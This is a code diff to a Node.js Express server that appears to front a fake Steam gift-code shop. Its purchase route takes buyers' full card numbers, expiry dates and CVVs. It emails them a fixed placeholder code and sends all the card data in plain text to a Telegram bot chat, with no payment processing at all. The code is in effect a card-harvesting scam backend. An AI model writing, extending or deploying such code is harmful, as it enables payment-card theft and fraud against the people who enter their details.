@@ -1,14 +1,14 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
-const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 require('dotenv').config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Email Sender
+// ✅ Email Sender
 async function sendEmail(email, ref, code) {
   const transporter = nodemailer.createTransport({
     service: 'gmail',
@@ -28,35 +28,33 @@ async function sendEmail(email, ref, code) {
   return transporter.sendMail(mailOptions);
 }
 
-// Telegram Notification
+// ✅ Telegram Notifier
 async function notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
-  const message = `✅ Steam Code Purchase\n📧 Email: ${email}\n🧾 Ref No: ${ref}\n💰 Amount: ₱${amount}\n👤 Card Name: ${cardName}\n💳 Card Number: ${cardNumber}\n📅 Expiry: ${expDate}\n🔐 CVV: ${cvv}`;
+  const message = `✅ Steam Code Purchase\n📧 Email: ${email}\n🧾 Ref No: ${ref}\n💰 Amount: ₱${amount}\n💳 Cardholder: ${cardName}\n🔢 Card #: ${cardNumber}\n📅 Expiry: ${expDate}\n🔐 CVV: ${cvv}`;
 
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text: message })
+    body: JSON.stringify({ chat_id: chatId, text: message }),
   });
 }
 
-// Main API Route
+// ✅ Purchase API
 app.post('/api/purchase', async (req, res) => {
-  const { ref, email, cardName, cardNumber, expDate, cvv } = req.body;
-  const code = "ABCD-1234-EFGH"; // Static or random code logic
-  const amount = 100;
+  const { ref, email, amount = 100, cardName, cardNumber, expDate, cvv } = req.body;
+  const code = "ABCD-1234-EFGH"; // TODO: Replace with real code logic
 
   try {
     await sendEmail(email, ref, code);
     await notifyTelegram(email, ref, amount, cardName, cardNumber, expDate, cvv);
     res.json({ success: true });
   } catch (err) {
-    console.error("❌ Server error:", err.message);
-    res.json({ success: false, message: err.message });
+    console.error("❌ Error:", err.message);
+    res.status(500).json({ success: false, message: err.message });
   }
 });
 
-// Start Server
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`✅ Server running on http://localhost:${PORT}`));
